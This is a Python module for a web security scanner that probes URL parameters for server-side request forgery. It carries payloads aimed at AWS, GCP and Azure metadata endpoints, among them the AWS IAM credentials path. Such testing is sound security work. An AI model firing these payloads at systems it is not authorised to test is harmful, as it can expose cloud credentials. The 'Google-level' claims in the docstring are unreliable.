"""
Advanced SSRF Scanner Module
Google-level SSRF detection with cloud metadata validation
"""

import re
from typing import List, Dict, Optional
from .validation_engine import AdvancedValidator

class SSRFScanner:
    """
    Enterprise-grade SSRF vulnerability scanner
    Cloud metadata testing with multi-stage validation
    """

    def __init__(self, parent_scanner):
        self.scanner = parent_scanner
        self.name = "SSRF Scanner (Advanced)"
        self.validator = AdvancedValidator(parent_scanner)
        self.payloads = self.generate_ssrf_payloads()

    def generate_ssrf_payloads(self) -> List[Dict]:
        """Generate high-confidence SSRF test payloads"""
        payloads = [
            # AWS metadata endpoints (CRITICAL findings)
            {
                'payload': 'http://169.254.169.254/latest/meta-data/ami-id',
                'type': 'AWS Metadata',
                'evidence': [r'ami-[a-z0-9]{8,}'],
                'severity': 'CRITICAL'
            },
            {
                'payload': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'type': 'AWS IAM Credentials',
                'evidence': ['iam/security-credentials', 'AssumeRole'],
                'severity': 'CRITICAL'
            },

            # GCP metadata endpoints
            {
                'payload': 'http://metadata.google.internal/computeMetadata/v1/instance/id',
                'type': 'GCP Metadata',
                'evidence': [r'\d{15,20}'],  # GCP instance IDs are long numbers
                'severity': 'CRITICAL',
                'headers': {'Metadata-Flavor': 'Google'}
            },

            # Azure metadata endpoints
            {
                'payload': 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                'type': 'Azure Metadata',
                'evidence': ['subscriptionId', 'vmId', 'resourceGroupName'],
                'severity': 'CRITICAL',
                'headers': {'Metadata': 'true'}
            },
        ]

        return payloads

    def test_parameter(self, url: str, param: str, value: str) -> List[Dict]:
        """Test parameter for SSRF with advanced validation"""
        vulnerabilities = []

        print(f"  [*] Testing parameter: {param}")

        # First, check if parameter accepts URLs
        test_url = "http://example.com/test.html"
        test_resp = self.scanner.smart_request(url, params={param: test_url})

        if not test_resp:
            print(f"    [-] Parameter not responsive")
            return vulnerabilities

        # Test each SSRF payload
        for payload_dict in self.payloads:
            print(f"    [*] Testing: {payload_dict['type']}...")

            # Prepare headers if needed
            headers = payload_dict.get('headers', {})
            if headers:
                old_headers = self.scanner.session.headers.copy()
                self.scanner.session.headers.update(headers)

            test_resp = self.scanner.smart_request(
                url,
                params={param: payload_dict['payload']},
                timeout=15
            )

            # Restore headers
            if headers:
                self.scanner.session.headers = old_headers

            if not test_resp:
                continue

            # Validate with advanced validator
            validation = self.validator.validate_ssrf(
                url, param, payload_dict['payload'],
                test_resp, payload_dict['type']
            )

            if validation.is_valid:
                print(f"    [+] Confirmed SSRF - {payload_dict['type']} (confidence: {validation.confidence:.2%})")
                vulnerabilities.append({
                    'type': f'Server-Side Request Forgery (SSRF) - {payload_dict["type"]}',
                    'severity': payload_dict['severity'],
                    'confidence': validation.confidence,
                    'url': url,
                    'parameter': param,
                    'payload': payload_dict['payload'],
                    'description': f'Confirmed SSRF allowing {payload_dict["type"]} access via parameter "{param}"',
                    'evidence': ' | '.join(validation.evidence),
                    'validation': 'Multi-stage cloud metadata validated - CONFIRMED',
                    'impact': 'Can access cloud provider metadata and potentially steal credentials'
                })
                return vulnerabilities  # Stop after finding SSRF

        return vulnerabilities

    def scan(self) -> List[Dict]:
        """Scan for SSRF vulnerabilities"""
        vulnerabilities = []

        from urllib.parse import urlparse, parse_qs

        parsed = urlparse(self.scanner.target)
        params = parse_qs(parsed.query)

        if not params:
            # Try common SSRF parameters
            print("  [*] No URL parameters found, testing common parameter names...")
            test_params = ['url', 'uri', 'path', 'dest', 'destination', 'redirect',
                          'download', 'fetch', 'file', 'src', 'source', 'target',
                          'link', 'image', 'img', 'proxy', 'api']
            for param in test_params:
                test_url = f"{self.scanner.target}?{param}=http://example.com"
                resp = self.scanner.smart_request(test_url)
                if resp and resp.status_code == 200:
                    vulns = self.test_parameter(self.scanner.target, param, 'http://example.com')
                    vulnerabilities.extend(vulns)
                    if vulns:
                        break  # Found SSRF, stop
        else:
            # Test existing parameters
            for param, values in params.items():
                value = values[0] if values else 'http://example.com'
                vulns = self.test_parameter(self.scanner.target, param, value)
                vulnerabilities.extend(vulns)
                if vulns:
                    break  # Found SSRF, stop

        return vulnerabilities
